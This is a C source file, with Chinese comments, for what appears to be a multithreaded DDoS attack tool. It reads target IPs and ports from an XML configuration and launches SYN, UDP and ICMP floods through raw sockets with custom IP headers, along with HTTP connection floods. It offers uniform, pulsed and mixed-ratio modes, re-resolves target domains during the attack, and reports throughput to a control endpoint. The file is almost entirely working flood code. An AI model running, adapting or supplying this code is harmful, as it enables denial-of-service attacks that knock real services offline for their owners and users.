/********************************************************************************/
/* 实施攻击程序                                                                 */
/********************************************************************************/

#include "attack.h"
#include "xmlctr.h"
#include "dataList.h"
#include "package.h"
#include "globalData.h"
#include "sendResultFile.h"

static float attackTimeRealgo;//全局变量:实际攻击的时间，主要用于发送包数多而设定攻击时间少时的时间统计
static ddosConfig * ddosc;
static unsigned long pthread_send_package_num[MAX_PTHREAD_NUM];//每个线程发送的包数,这个数存在越界问题
static unsigned long pthread_send_package_byte[MAX_PTHREAD_NUM];
extern int pthread_shutdown;
/********************************************************************************/
/* 求两个整数的最大公约数                                                       */
/********************************************************************************/
int getcd(int n,int m)
{
    int t,r;
    int result;
    if(n==0||m==0){//如果其中有一个数为0，则返回俩数中的大数
        if(n>=m)
            result = n;
        else
            result = m;
    } 
    else{//两数均不为0
        if(n<m){
            t=n;
            n=m;
            m=t;
        }
        while(m!=0){
            r=n%m;
            n=m;
            m=r;
        }
        result = n;
    }
    return result;
}
/********************************************************************************/
/* 写行内容到文件中                                                             */
/********************************************************************************/
int writeToFile(char * LineContent)
{
    //打开输出文件
    FILE * fp;
	fp = fopen("attackResult.txt","a");
    if(fp == NULL){
        printf("X Error: File:attackResult.txt Can Not Open To Write\n");
        return 0;
    }
	fprintf(fp,"%s\r\n",LineContent);
    fclose(fp);
	return 1;
}
/********************************************************************************/
/* 写字符到指定文件                                                             */
/* 输入参数:字符,要写入的文件                                                   */
/********************************************************************************/
int writechartofile(int s,char *filename)
{
    FILE *fp;
    if((fp=fopen(filename,"w"))==NULL){
        printf("can't open file.");
        return 0;
    }
    fprintf(fp,"%d",s);
    fclose(fp);
    return 1;
}
/********************************************************************************/
/* 单一模式下每个攻击线程的执行                                                 */
/********************************************************************************/
void *newppthread_signal(void *attackM)
{
	char * datap;
	int attackIpLinklength,attackPortLinkLength;
	attackIpLinklength = getLinkLength_arr(ddosc->ipls);
	attackPortLinkLength = getLinkLength_arr(ddosc->portls);
    int packetLen;//发送包的包长
    struct sockaddr_in sin;
    int sockfd,foo,ret;
    struct attackM_st *attDT = (struct  attackM_st *)attackM;
	//printf("_attackIp:%s\n",attDT->attackIp);
    //printf("_attackPort:%s\n",attDT->attackPort);
	//printf("____pthread_id:%d\n",attDT->pthread_id);
    int attackStyleNum=0;//攻击类型编号
    //判断是哪种类型的攻击
    if(ddosc->synStyle!=NULL){//synflood
        attackStyleNum = 1;
		printf("* pthread%d:tcpflood\n",attDT->pthread_id);
	}
    else if(ddosc->udpStyle!=NULL){//udpflood
        attackStyleNum = 2;
		printf("* pthread%d:udpflood\n",attDT->pthread_id);
	}
    else if(ddosc->icmpStyle!=NULL){//icmpflood
        attackStyleNum = 3;
		printf("* pthread%d:icmpflood\n",attDT->pthread_id);
	}
    else if(ddosc->httpStyle!=NULL){//httpflood
        attackStyleNum = 4;
		printf("* pthread%d:httpflood\n",attDT->pthread_id);
	}
	if(attackStyleNum==1){
		if((sockfd=socket(AF_INET,SOCK_RAW,IPPROTO_TCP)) == -1){
            perror("socket wrong!");
            exit(1);
        }
		packetLen=ddosc->synStyle->packetLength;
	}
	else if(attackStyleNum==2){
		if((sockfd=socket(AF_INET,SOCK_RAW,IPPROTO_UDP)) == -1){
            perror("socket wrong!");
            exit(1);
        }
		packetLen = ddosc->udpStyle->packetLength;
	}
	else if(attackStyleNum==3){
		if((sockfd=socket(AF_INET,SOCK_RAW,IPPROTO_ICMP)) == -1){
            perror("socket wrong!");
            exit(1);
        }
		packetLen = ddosc->icmpStyle->packetLength;
	}
	else
		packetLen=ddosc->httpStyle->packetLength;
    if(attackStyleNum!=4) { //不是http
        foo=1;
        if( (setsockopt(sockfd, 0, IP_HDRINCL, (char *)&foo, sizeof(int)))==-1 ){
            printf("could not set raw header on socket\n");
            exit(1);
        }
    }
    //获得发送包数与攻击时间,此处包数与攻击时间将会有矛盾，暂以最长为条件
    int sendPacketNumber;//需要发送的最小包数
    double attackTime;//秒为单位
    sendPacketNumber = ddosc->sendPacketNumber;
    attackTime = ddosc->attackTime;//得到包间隔时间，对包与包之间的发送数据间隔进行控制
    int tempTime;//获得的间隔时间
    struct timeval t_start;//start time when send starts
    struct timeval t_end;//end time when one send over
    float sendedtime=0;//已攻击时间
    float tempfloattime;
	int pulseyn = ddosc->pulseyn;//首先检查是否为心跳攻击
	sin.sin_family=AF_INET;
	if((sin.sin_port=htons(atoi(attDT->attackPort)))==0){
		printf("unknown port.\n");
		return NULL;
	}
    gettimeofday(&t_start,NULL);

    
    //检查时间，确定是否需要重新获取目的IP
    time_t t_c_start;//start time when send starts
    time_t t_c_end;//end time when one send over
    char oldip[40];
    char newip[40]; 

    strcpy(oldip,attDT->attackIp);
    sin.sin_addr.s_addr =inet_addr(attDT->attackIp);    
    t_c_start = time(0);
    
	if(pulseyn==1){//均匀攻击
		if(attackStyleNum!=4)
		{//不是http
			while( !pthread_shutdown&&
			    (pthread_send_package_num[attDT->pthread_id]<sendPacketNumber||sendedtime<attackTime)
			)
			{
                if(ddosc->src_type==1 && ddosc->getip_time )//type=domain and time!=0
                {                
                    t_c_end = time(0);
                    if( t_c_end-t_c_start > ddosc->getip_time )
                    {
                        ret = req_fir_domain_ip(newip,ddosc->src_domain,oldip);
                        if(ret==1)
                        {
                            strcpy(oldip,newip);
                            sin.sin_addr.s_addr =inet_addr(oldip);
                        }
                        t_c_start = time(0);
                    }
                }
			
                //组包
				if(attackStyleNum==1) { //获得tcpflood攻击包
					datap = ip_tcp_package(ddosc->synStyle,oldip,attDT->attackPort);
				}
				else if(attackStyleNum==2) { //udp攻击包
					datap = ip_udp_package(ddosc->udpStyle,oldip,attDT->attackPort);
				}
				else if(attackStyleNum==3) { //icmp攻击包
					datap = ip_icmp_package(ddosc->icmpStyle,oldip,attDT->attackPort);
				}
				if(sendto(sockfd,datap,packetLen,0,(struct sockaddr *)&sin,sizeof(struct sockaddr_in))==-1){
					perror("X Error:send package wrong.");
					//exit(1);
					continue;
				}
				pthread_send_package_num[attDT->pthread_id]++;
				//间隔发包
				tempTime = getSleepTime(ddosc->packetTimels);
				//printf("sleepTime:%d;",tempTime);
				if(tempTime!=0)
					usleep(tempTime);
				gettimeofday(&t_end,NULL);
				tempfloattime = 1000000*(t_end.tv_sec-t_start.tv_sec)+(t_end.tv_usec-t_start.tv_usec);
				sendedtime = tempfloattime/1000000;
			}
			close(sockfd);
		}
		else if(attackStyleNum==4) { //发送http攻击包
			while(!pthread_shutdown&&(pthread_send_package_num[attDT->pthread_id]<sendPacketNumber||sendedtime<attackTime)){
				if((sockfd=socket(AF_INET,SOCK_STREAM,0)) == -1){
					perror("socket wrong!");
					exit(1);    
				}
				ret = connect(sockfd,(struct sockaddr *)&sin,sizeof(sin));
				if(ret)
				    printf("failed to connect to %s.\n",attDT->attackIp);
				else{
					datap = http_package(ddosc->httpStyle);
					ret = write(sockfd,datap,packetLen-40);
				}
				pthread_send_package_num[attDT->pthread_id]++;
				//间隔发包
				tempTime = getSleepTime(ddosc->packetTimels);
				if(tempTime!=0)
					usleep(tempTime);
				
				gettimeofday(&t_end,NULL);
				tempfloattime = 1000000*(t_end.tv_sec-t_start.tv_sec)+(t_end.tv_usec-t_start.tv_usec);
				sendedtime = tempfloattime/1000000;
				close(sockfd);
			}
		}
		//当该线程攻击时间大于此时的实际攻击时间时，将大的给予实际攻击时间
		if(sendedtime>attackTimeRealgo){
			attackTimeRealgo = sendedtime;
		}
	}
	else{//心跳攻击
		int cycleTime = ddosc->cycleTime;//周期时间(s)
		int pulseTime = ddosc->pulseTime;//心跳攻击周期时间(s)
		int speed = ddosc->speed;//发包速率(个/s)
		int sendedpulsenum;//攻击脉冲周期中发送的包数
		int pulseNum = attackTime/cycleTime ;//周期数
		int ipulse; 
		struct timeval t_pulse_start;//start pulse time when send starts
		struct timeval t_pulse_end;//end pulse time when send starts
		float sendedpulsetime;//发pulse包时间(s)
		int sleepTime = (cycleTime-pulseTime)*1000000;//微秒级别
		int sPackageTime = 1000000/speed-getOnePackageTime;//发1个包时间微秒,当前默认组织一个数据包的平均时间为70us
		if(sPackageTime<0)
			sPackageTime=0;
		int sendallpacnum;//每个脉冲发送的包数 
		sendallpacnum = pulseTime*speed;
		if(attackStyleNum!=4){//不是http
			for(ipulse=0;ipulse<pulseNum;ipulse++){
				gettimeofday(&t_pulse_start,NULL);
				sendedpulsetime=0;
				sendedpulsenum=0;
				while(!pthread_shutdown&&sendedpulsenum<sendallpacnum&&sendedpulsetime<pulseTime)
				{
                    if(ddosc->src_type==1 && ddosc->getip_time)
                    {                
                        t_c_end = time(0);
                        if( t_c_end-t_c_start > ddosc->getip_time )
                        {
                            ret = req_fir_domain_ip(newip,ddosc->src_domain,oldip);
                            if(ret==1)
                            {
                                strcpy(oldip,newip);
                                sin.sin_addr.s_addr =inet_addr(oldip);
                            }
                            t_c_start = time(0);
                        }
                    }
				    
					//组包
					if(attackStyleNum==1) { //获得tcpflood攻击包
						//packetLen=ddosc->synStyle.packetLength;
						datap = ip_tcp_package(ddosc->synStyle,attDT->attackIp,attDT->attackPort);
					}
					else if(attackStyleNum==2) { //udp攻击包
						//packetLen = ddosc->udpStyle.packetLength;
						datap = ip_udp_package(ddosc->udpStyle,attDT->attackIp,attDT->attackPort);
					}
					else if(attackStyleNum==3) { //icmp攻击包
						//packetLen = ddosc->icmpStyle->packetLength;
						datap = ip_icmp_package(ddosc->icmpStyle,attDT->attackIp,attDT->attackPort);
					}
					//发送数据包
					if(sendto(sockfd,datap,packetLen,0,(struct sockaddr *)&sin,sizeof(struct sockaddr_in))==-1){
						perror("send wrong!");
						//exit(1);
						continue;
					}
					sendedpulsenum++;
					pthread_send_package_num[attDT->pthread_id]++;
					usleep(sPackageTime);
					gettimeofday(&t_pulse_end,NULL);
					tempfloattime = 1000000*(t_end.tv_sec-t_start.tv_sec)+(t_end.tv_usec-t_start.tv_usec);  
					sendedpulsetime =tempfloattime/1000000;//s
					//printf("sendpulsetime:%f\n",sendedpulsetime);
				}
				usleep(sleepTime);
			}
			close(sockfd);
		}
		else if(attackStyleNum==4) { //发送http攻击包
			for(ipulse=0;ipulse<pulseNum;ipulse++){
				gettimeofday(&t_pulse_start,NULL);
				sendedpulsetime=0;
				sendedpulsenum=0;
				while(!pthread_shutdown&&pthread_send_package_num[attDT->pthread_id]<pulseTime*speed&&sendedpulsetime<pulseTime){
					if((sockfd=socket(AF_INET,SOCK_STREAM,0)) == -1){
						perror("socket wrong!");
						exit(1);
					}
					ret = connect(sockfd,(struct sockaddr *)&sin,sizeof(sin));
					if(ret){
						printf("failed to connect to %s.\n",attDT->attackIp);
					}
					else {
						//packetLen=ddosc->httpStyle->packetLength;
						datap = http_package(ddosc->httpStyle);
						ret = write(sockfd,datap,packetLen-40);
					}
					pthread_send_package_num[attDT->pthread_id]++;
					sendedpulsenum++;
					usleep(sPackageTime);
					gettimeofday(&t_pulse_end,NULL);
					tempfloattime = 1000000*(t_pulse_end.tv_sec-t_pulse_start.tv_sec)+(t_pulse_end.tv_usec-t_pulse_start.tv_usec);  
					sendedpulsetime =tempfloattime/1000000;//s
					close(sockfd);
				}
				usleep(sleepTime);
			}
		}
	}
	pthread_send_package_byte[attDT->pthread_id] = packetLen*pthread_send_package_num[attDT->pthread_id];
	if(attDT)
		free(attDT);
	return NULL;
}
/********************************************************************************/
/* 混合模式攻击子线程的执行                                                     */
/********************************************************************************/
void *newppthread_fixed(void *attackM)
{
    int attackIpLinklength,attackPortLinkLength;
    attackIpLinklength = getLinkLength_arr(ddosc->ipls);
    attackPortLinkLength = getLinkLength_arr(ddosc->portls);
    struct sockaddr_in sin;
    int sockfd,sockfd_http,sockfd_tcp,sockfd_udp,sockfd_icmp;
    struct attackM_st *attDT = (struct  attackM_st *)attackM;
    int ret,foo=1;
    char * datap;

    //建立socket
    if((sockfd=socket(AF_INET,SOCK_RAW,255)) == -1){
        perror("socket wrong!");
        exit(1);
    }
    int sendPacketNumber;
    double attackTime;//秒为单位
    sendPacketNumber = ddosc->sendPacketNumber;
    attackTime = ddosc->attackTime;
    //得到包间隔时间，对包与包之间的发送数据间隔进行控制
    int sendednum=0;//已发送包数
    int sendnum_syn=0,sendnum_icmp=0,sendnum_udp=0,sendnum_http=0;//需要发送的4种类型的包数
    int i_syn,i_icmp,i_udp,i_http;//每个序列顺次发送的4种类型的包数
    int sum_syn=0,sum_icmp=0,sum_udp=0,sum_http=0;//各类型累计发送的包数
    int paclen_syn=0,paclen_icmp=0,paclen_udp=0,paclen_http=0;//各类型包的包长
    int maxcd=1;//4数的最大公约数
    int i;//累加计数
    int tempTime;//获得的间隔时间
    struct timeval t_start;//start time when send starts
    struct timeval t_end;//end time when one send over
    float sendedtime=0;//已攻击时间
    float tempfloattime;
    int packNum;//均匀攻击与心跳攻击需要进行统计的比例包数不同
	//首先检查是否为心跳攻击
	int pulseyn = ddosc->pulseyn;
	if(pulseyn==1)
		packNum = ddosc->sendPacketNumber;
	else
		packNum = ddosc->speed;//心跳攻击以每秒发送的包数作为统计比例
    //得到各style发包数目    
    if(ddosc->synStyle!=NULL){//需要发送syn包
        sendnum_syn=ddosc->synStyle->percentage*packNum;
        maxcd = getcd(getcd(getcd(sendnum_syn,sendnum_icmp),sendnum_udp),sendnum_http);//得到4个发送包数的公约数
        paclen_syn = ddosc->synStyle->packetLength;
        //printf("maxcd:%d\n",maxcd);
		if((sockfd_tcp=socket(AF_INET,SOCK_RAW,IPPROTO_TCP)) == -1){
            perror("socket wrong!");
            exit(1);
        }
		if( (setsockopt(sockfd_tcp, 0, IP_HDRINCL, (char *)&foo, sizeof(int)))==-1 ){
            printf("could not set raw header on socket\n");
            exit(1);
        }
    }
    if(ddosc->udpStyle!=NULL){//需要发送udp包
        sendnum_udp=ddosc->udpStyle->percentage*packNum;
        maxcd = getcd(getcd(getcd(sendnum_syn,sendnum_icmp),sendnum_udp),sendnum_http);//得到4个发送包数的公约数
        paclen_udp = ddosc->udpStyle->packetLength;
        //printf("maxcd:%d\n",maxcd);
		if((sockfd_udp=socket(AF_INET,SOCK_RAW,IPPROTO_UDP)) == -1){
            perror("socket wrong!");
            exit(1);
        }
		if( (setsockopt(sockfd_udp, 0, IP_HDRINCL, (char *)&foo, sizeof(int)))==-1 ){
            printf("could not set raw header on socket\n");
            exit(1);
        }
    }
    if(ddosc->icmpStyle!=NULL){//需要发送icmp包
        sendnum_icmp=ddosc->icmpStyle->percentage*packNum;
        maxcd = getcd(getcd(getcd(sendnum_syn,sendnum_icmp),sendnum_udp),sendnum_http);//得到4个发送包数的公约数
        paclen_icmp = ddosc->icmpStyle->packetLength;
        //printf("maxcd:%d\n",maxcd);
		if((sockfd_icmp=socket(AF_INET,SOCK_RAW,IPPROTO_ICMP)) == -1){
            perror("socket wrong!");
            exit(1);
        }
		if( (setsockopt(sockfd_icmp, 0, IP_HDRINCL, (char *)&foo, sizeof(int)))==-1 ){
            printf("could not set raw header on socket\n");
            exit(1);
        }
    }
    if(ddosc->httpStyle!=NULL){//需要发送http包,需要建立socket数
        sendnum_http=ddosc->httpStyle->percentage*packNum;
        maxcd = getcd(getcd(getcd(sendnum_syn,sendnum_icmp),sendnum_udp),sendnum_http);//得到4个发送包数的公约数
        paclen_http = ddosc->httpStyle->packetLength;
        //printf("maxcd:%d\n",maxcd);
    }
    //得到每次发送的各类型包序列数
    i_syn = sendnum_syn/maxcd;
    i_icmp = sendnum_icmp/maxcd;
    i_udp = sendnum_udp/maxcd;
    i_http = sendnum_http/maxcd;

	sin.sin_family=AF_INET;
	if((sin.sin_port=htons(atoi(attDT->attackPort)))==0){
		printf("unknown port.\n");
		return NULL;
	}
	sin.sin_addr.s_addr =inet_addr(attDT->attackIp);
	gettimeofday(&t_start,NULL);//开始计时
	if(pulseyn==1){ //均匀攻击
		while(!pthread_shutdown&&(sendednum<sendPacketNumber||sendedtime<attackTime)){
			for(i=0;i<i_syn;i++){//syn包
				//组包
				datap = ip_tcp_package(ddosc->synStyle,attDT->attackIp,attDT->attackPort);
				//发送包
				if(sendto(sockfd_tcp,datap,ddosc->synStyle->packetLength,0,(struct sockaddr *)&sin,sizeof(struct sockaddr_in))==-1){
					perror("send wrong!");
					//exit(1);
					continue;
				}
				sendednum++;
				sum_syn++;
				pthread_send_package_num[attDT->pthread_id]++;
				//间隔发包
				tempTime = getSleepTime(ddosc->packetTimels);
				printf("sleepTime:%d\n",tempTime);
				if(tempTime!=0){
					usleep(tempTime);
				}
			}
			for(i=0;i<i_icmp;i++){
				//组包
				datap = ip_icmp_package(ddosc->icmpStyle,attDT->attackIp,attDT->attackPort);
				//发送包
				if(sendto(sockfd_icmp,datap,ddosc->icmpStyle->packetLength,0,(struct sockaddr *)&sin,sizeof(struct sockaddr_in))==-1){
					perror("send wrong!");
					//exit(1);
					continue;
				}
				sendednum++;
				sum_icmp++;
				pthread_send_package_num[attDT->pthread_id]++;
				//间隔发包
				tempTime = getSleepTime(ddosc->packetTimels);
				if(tempTime!=0){
					usleep(tempTime);
				}
			}
			for(i=0;i<i_udp;i++){
				//组包
				datap = ip_udp_package(ddosc->udpStyle,attDT->attackIp,attDT->attackPort);
				//发送包
				if(sendto(sockfd_udp,datap,ddosc->udpStyle->packetLength,0,(struct sockaddr *)&sin,sizeof(struct sockaddr_in))==-1){
					perror("send wrong!");
					//exit(1);
					continue;
				}
				sendednum++;
				sum_udp++;
				pthread_send_package_num[attDT->pthread_id]++;
				tempTime = getSleepTime(ddosc->packetTimels);//间隔发包
				printf("sleepTime:%d\n",tempTime);
				if(tempTime!=0){
					usleep(tempTime);
				}
			}
			for(i=0;i<i_http;i++){
				//http类型数据包发送
				//建立socket
				if((sockfd_http=socket(AF_INET,SOCK_STREAM,0)) == -1){
					perror("socket wrong!");
					exit(1);    
				}
				ret = connect(sockfd_http,(struct sockaddr *)&sin,sizeof(sin));
				/*if(ret){
					printf("failed to connect to server.\n");
					return;
				}*/
				if(ret==0){
					datap = http_package(ddosc->httpStyle);
					ret = write(sockfd,datap,ddosc->httpStyle->packetLength-40);
					sendednum++;
					sum_http++;
					pthread_send_package_num[attDT->pthread_id]++;
					if(tempTime!=0)
						usleep(tempTime);//间隔发包
					close(sockfd_http);
				}
			}
			gettimeofday(&t_end,NULL);
			tempfloattime = 1000000*(t_end.tv_sec-t_start.tv_sec)+(t_end.tv_usec-t_start.tv_usec);
			sendedtime =tempfloattime/1000000;
		}
		close(sockfd_tcp);
		close(sockfd_udp);
		close(sockfd_icmp);
		//当该线程攻击时间大于此时的实际攻击时间时，将大的给予实际攻击时间
		if(sendedtime>attackTimeRealgo){
			attackTimeRealgo = sendedtime;
		}
	}
	else { //心跳攻击
		int cycleTime = ddosc->cycleTime;//周期时间(s)
		int pulseTime = ddosc->pulseTime;//心跳攻击周期时间(s)
		int speed = ddosc->speed;//发包速率(个/s)
		int sendedpulsenum; 
		int pulseNum = attackTime/cycleTime;//周期数 
		int ipulse;
		struct timeval t_pulse_start;//start pulse time when send starts
		struct timeval t_pulse_end;//end pulse time when send starts
		float sendedpulsetime;//发pulse包时间s
		//cycleTime>pulseTime,此处不做验证
		int sleepTime = (cycleTime-pulseTime)*1000000;//微妙级别
		int sPackageTime = 1000000/speed-getOnePackageTime;//发1个包时间,微妙级别
		if(sPackageTime<0)
			sPackageTime=0;
		for(ipulse=0;ipulse<pulseNum;ipulse++){   
			gettimeofday(&t_pulse_start,NULL);
			sendedpulsetime=0;
			sendedpulsenum=0;
			while(!pthread_shutdown&&sendedpulsenum<pulseTime*speed&&sendedpulsetime<pulseTime){//每周期循环
				for(i=0;i<i_syn;i++){//syn包
					//组包
					datap = ip_tcp_package(ddosc->synStyle,attDT->attackIp,attDT->attackPort);
					//发送包
					if(sendto(sockfd_tcp,datap,ddosc->synStyle->packetLength,0,(struct sockaddr *)&sin,sizeof(struct sockaddr_in))==-1){
						perror("send wrong!");
						//exit(1);
						continue;
					}
					sendednum++;
					sum_syn++;
					sendedpulsenum++;
					pthread_send_package_num[attDT->pthread_id]++;
					usleep(sPackageTime);
				}
				for(i=0;i<i_icmp;i++){
					//组包
					datap = ip_icmp_package(ddosc->icmpStyle,attDT->attackIp,attDT->attackPort);
					//发送包
					if(sendto(sockfd,datap,ddosc->icmpStyle->packetLength,0,(struct sockaddr *)&sin,sizeof(struct sockaddr_in))==-1){
						perror("send wrong!");
						//exit(1);
						continue;
					}
					sendednum++;
					sum_icmp++;
					sendedpulsenum++;
					pthread_send_package_num[attDT->pthread_id]++;
					usleep(sPackageTime);
				}
				for(i=0;i<i_udp;i++){
					//组包
					datap = ip_udp_package(ddosc->udpStyle,attDT->attackIp,attDT->attackPort);
					//发送包
					if(sendto(sockfd,datap,ddosc->udpStyle->packetLength,0,(struct sockaddr *)&sin,sizeof(struct sockaddr_in))==-1){
						perror("send wrong!");
						//exit(1);
						continue;
					}
					sendednum++;
					sum_udp++;
					sendedpulsenum++;
					pthread_send_package_num[attDT->pthread_id]++;
					usleep(sPackageTime);
				}
				for(i=0;i<i_http;i++){
					//http类型数据包发送
					//建立socket
					if((sockfd_http=socket(AF_INET,SOCK_STREAM,0)) == -1){
						perror("socket wrong!");
						exit(1);
						
					}
					ret = connect(sockfd_http,(struct sockaddr *)&sin,sizeof(sin));
					/*if(ret){
						printf("failed to connect to server.\n");
						return;			
					}*/
					//printf("httpflood::");
					//printf("packetlength:%d\n",ddosc->httpStyle->packetLength);
					if(ret==0){
						datap = http_package(ddosc->httpStyle);
						ret = write(sockfd,datap,ddosc->httpStyle->packetLength-40);
						sendednum++;
						sum_http++;
						sendedpulsenum++;
						pthread_send_package_num[attDT->pthread_id]++;
						close(sockfd_http);
						usleep(sPackageTime);
					}
				}
				gettimeofday(&t_pulse_end,NULL);
				tempfloattime = 1000000*(t_pulse_end.tv_sec-t_pulse_start.tv_sec)+(t_pulse_end.tv_usec-t_pulse_start.tv_usec);
				sendedpulsetime =tempfloattime/1000000;//us
			}
			usleep(sleepTime);
		}
		close(sockfd);
	}
	//计算发送总流量
    pthread_send_package_byte[attDT->pthread_id] += sendnum_syn*paclen_syn + sendnum_udp*paclen_udp + sendnum_icmp*paclen_icmp + sendnum_http*paclen_http;
	if(attDT)
		free(attDT);
	return NULL;
}
/********************************************************************************/
/* 攻击每个ip的某个port,开指定数据的攻击线程                                    */
/********************************************************************************/
void *newthread(struct attackM_st *attackM_t)
{
    int i,err;
    pthread_t ppid[MAX_PTHREAD_NUM];
    int threadNumber = ddosc->startThreadNumber;//开启线程数
    if(ddosc->mode==1){
        for(i=0;i<threadNumber;i++){
			struct attackM_st * attackM;
			attackM = (struct attackM_st *)malloc(sizeof(struct attackM_st));
			memset(attackM,0,sizeof(struct attackM_st));
			attackM->attackIp = attackM_t->attackIp;
			attackM->attackPort = attackM_t->attackPort;
			attackM->pthread_id = i;
            err=pthread_create(&ppid[i],NULL,newppthread_signal,(void *)attackM);//创建单模式攻击子线程
            if(err!=0){
                printf("create pthread error!\n");
                exit(1);
        	}
        }
		for(i=0;i<threadNumber;i++)
			pthread_join(ppid[i],NULL);
    }
    else {
        for(i=0;i<threadNumber;i++){
			struct attackM_st * attackM;
			attackM = (struct attackM_st *)malloc(sizeof(struct attackM_st));
			memset(attackM,0,sizeof(struct attackM_st));
			attackM->attackIp = attackM_t->attackIp;
			attackM->attackPort = attackM_t->attackPort;
			attackM->pthread_id = i;
            err=pthread_create(&ppid[i],NULL,newppthread_fixed,(void *)&attackM);//创建混合攻击子线程
            if(err!=0){
                printf("create pthread error!\n");
                exit(1);
        	}
        }
		for(i=0;i<threadNumber;i++)
			pthread_join(ppid[i],NULL);
    }
	return NULL;
}
/********************************************************************************/
/* 获得各线程发送包数之和                                                       */
/* 返回:包数总和                                                                */
/********************************************************************************/
unsigned long getSendPackageNum()
{
	int i;
	unsigned long sum=0;
	char lineContentTemp[MAXSIZE];
	int threadNumber = ddosc->startThreadNumber;//开启线程数
	for(i=0;i<threadNumber;i++){
		/* output*******************************/
		printf("* pthread%d:send package num:%ld\n",i,pthread_send_package_num[i]);
		bzero(lineContentTemp,MAXSIZE);
        sprintf(lineContentTemp,
				"* pthread%d:send package num:%ld<br>\n",
				i,pthread_send_package_num[i]);
        writeToFile(lineContentTemp);
		sum += pthread_send_package_num[i];
		/***************************************/
	}
	return sum;
}
/********************************************************************************/
/* 获得各线程发送Byte之和                                                       */
/* 返回:流量Byte总和                                                            */
/********************************************************************************/
unsigned long getSendByte()
{
	int i;
	unsigned long sum=0;
	char lineContentTemp[MAXSIZE];
	int threadNumber = ddosc->startThreadNumber;//开启线程数
	for(i=0;i<threadNumber;i++){
		/* output*******************************/
		printf("* pthread%d:send byte:%ldB\n",i,pthread_send_package_byte[i]);
		bzero(lineContentTemp,MAXSIZE);
        sprintf(lineContentTemp,
				"* pthread%d:send byte:%ldB<br>\n",
				i,pthread_send_package_byte[i]);
        writeToFile(lineContentTemp);
		/***************************************/
		sum += pthread_send_package_byte[i];
	}
	return sum;
}
void clearSendDate()
{
	int i;
	for(i=0;i<MAX_PTHREAD_NUM;i++){
		pthread_send_package_num[i]=0;
		pthread_send_package_byte[i]=0;
	}
}
/********************************************************************************/
/* 开始攻击的主函数                                                             */
/* 输入参数:xml文件的路径                                                       */
/********************************************************************************/
void *startAttack(void * docname)
{
	printf("Action: attack pthread created success.\n");
	attackTimeRealgo=0;
    struct attackM_st attackM;
    double bps,pps,doublepacknum;
	unsigned long sendpackagenumberall,send_all_byte;
	
    char lineContentTemp[MAXSIZE];
    FILE * fp = fopen("attackResult.txt","w");//将输出文件清空
    fclose(fp);
    ddosc = parseDoc(docname);//从xml中读数据，并格式化(将style数据格式化)
	if(ddosc==NULL){
		destroy_ddosConfig(ddosc);
		return NULL;
	}
	//outputList_arr(ddosc->ipls);
	//获得要攻击的ip以及port，依次开线程攻击
    int i,j;
    int attackIpLinklength,attackPortLinkLength;
    attackIpLinklength = getLinkLength_arr(ddosc->ipls);
    attackPortLinkLength = getLinkLength_arr(ddosc->portls);
    for(i=0;i<attackIpLinklength;i++){
        attackM.attackIp = getSomeone_arr(ddosc->ipls,i);
        for(j=0;j<attackPortLinkLength;j++){
			clearSendDate();
            attackM.attackPort = getSomeone_arr(ddosc->portls,j);
            /* output***************************************************/
			printf("******************************************\n");
            printf("* attack ip:%s,attack port:%s\n",attackM.attackIp,attackM.attackPort);
			printf("* ----------------------------------------\n");
			
            bzero(lineContentTemp,MAXSIZE);
            sprintf(lineContentTemp,
					"******************************************<br>\n* attackip:%s,attackport:%s<br>\n* ----------------------------------------------------------------<br>\n",
					attackM.attackIp,attackM.attackPort);
            writeToFile(lineContentTemp);
            /***********************************************************/
			newthread(&attackM);//顺次攻击每个ip每个端口
			sendpackagenumberall = getSendPackageNum();
			send_all_byte = getSendByte();
			/* output***************************************************/
			printf("* send all package number:%ld\n",sendpackagenumberall);
			printf("* send time(s):%.6fs\n",attackTimeRealgo);
            bzero(lineContentTemp,MAXSIZE);
            sprintf(lineContentTemp,
					"* send all package number:%ld<br>\n* send time(s):%.6fs<br>\n",
					sendpackagenumberall,attackTimeRealgo);
			writeToFile(lineContentTemp);
			/***********************************************************/
			doublepacknum = (double)sendpackagenumberall;
            if(ddosc->pulseyn==1) { //均匀攻击
                pps = doublepacknum/(attackTimeRealgo*1000);
                bps = ((double)send_all_byte*8)/(1024*1024*attackTimeRealgo);
				/* output***************************************************/
                printf("* pps:%.3fk/s\n",pps);
                printf("* bps:%.3fmb/s\n",bps);
                bzero(lineContentTemp,MAXSIZE);
                sprintf(lineContentTemp,
						"* pps:%.3fk/s<br>\n* bps:%.3fmb/s<br>\n******************************************<br>\n",
						pps,bps);
                writeToFile(lineContentTemp);
				/***********************************************************/
            }
            else{
                int realAttackTime = (ddosc->attackTime/ddosc->cycleTime)*ddosc->pulseTime;//心跳攻击中脉冲攻击总时间
                pps = doublepacknum/(realAttackTime*1000);
                bps = ((double)send_all_byte*8)/(1024*1024*realAttackTime);
                printf("* pps:%.3fk/s(only statistics data in pulse time)\n",pps);
                printf("* bps:%.3fmb/s(only statistics data in pulse time)\n",bps);
                printf("* total pps:%.3fk/s\n",doublepacknum/(ddosc->attackTime*1000));
                printf("* total bps:%.3fmb/s\n",((double)send_all_byte*8)/(ddosc->attackTime*1024*1024));
                bzero(lineContentTemp,MAXSIZE);
                sprintf(lineContentTemp,
						"* pps:%.3fk/s(only statistics data in pulse time)<br>\n* bps:%.3fmb/s(only statistics data in pulse time)<br>\n* total pps:%.3fk/s<br>\n* total bps:%.3fmb/s<br>\n******************************************<br>\n",
						pps,bps,doublepacknum/(ddosc->attackTime*1000),((double)send_all_byte*8)/(ddosc->attackTime*1024*1024));
                writeToFile(lineContentTemp);
            }
			printf("*******************************************\n");
        }
    }
	//destroy ddosc
	destroy_ddosConfig(ddosc);
	#ifndef DDOS_NO_CONTROL_ON
	if(sendResult()) //将结果发送到控制端
		printf("send result fail!\n");
	#endif
	printf("\n");
	return NULL;
}

